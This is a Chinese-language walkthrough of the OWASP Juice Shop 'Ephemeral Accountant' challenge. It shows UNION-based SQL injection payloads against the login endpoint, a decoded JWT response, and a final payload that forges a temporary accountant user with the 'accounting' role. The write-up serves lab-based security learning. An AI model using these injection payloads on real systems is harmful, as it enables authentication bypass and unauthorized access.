---
title: Ephemeral Accountant
description: 并不尝试注入数据库，而是使用联合返回暂时的自定义内容
---

- 描述：Log in with the (non-existing) accountant ```acc0unt4nt@juice-sh.op``` without ever registering that user.
- 提示：无需实际存在于数据库只需暂时存在，使用 UNION 设置字符串
- 已知：
    - 登录页面存在 SQL 注入 ```POST /rest/user/login HTTP/1.1```
    - 用户表存在 13 列，及其字段
- 构建测试向量
    ```json
    {
        "email":"xxx' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--","password":"a"
    }
    ```
    响应
    ```json
    {
        "status": "totp_token_required",
        "data": {
            "tmpToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VySWQiOjEsInR5cGUiOiJwYXNzd29yZF92YWxpZF9uZWVkc19zZWNvbmRfZmFjdG9yX3Rva2VuIiwiaWF0IjoxNzY1Njk0Nzc1fQ.nCnzO_VK-7ir-NvastJMLcIiXjzY9PJetS_Gm5C8WETK_iyX4zOL1m0xZsJlEGB2igssQpktzOK4Skf0AtLqNT6P6kuOz0OgLp2TL5QN4gd8OavoMStnO-YmK23M_l9c5G97ZuZKGt8TGTO0K5TYPMyQSkl7NnyO6ciEzhdy4GU"
        }
    }
    ```
    - 似乎要求设置 ```totpSecret``` 字段，已知其默认为空
    - 其中第二段 JWT 为
        ```json
        {
            "userId": 1,
            "type": "password_valid_needs_second_factor_token",
            "iat": 1765694775
        }
        ```
- 构建攻击向量
    ```json
    {
        "email":"xxx' UNION SELECT 1,'foousername','acc0unt4nt@juice-sh.op','foopassword','accounting',6,7,8,'',10,11,12,13--",
        "password":"a"}
    ```
    - ```totpSecret``` 字段设置为空
    - 查看示例解决方案，其中角色字段设置为 ```accounting```才可通过挑战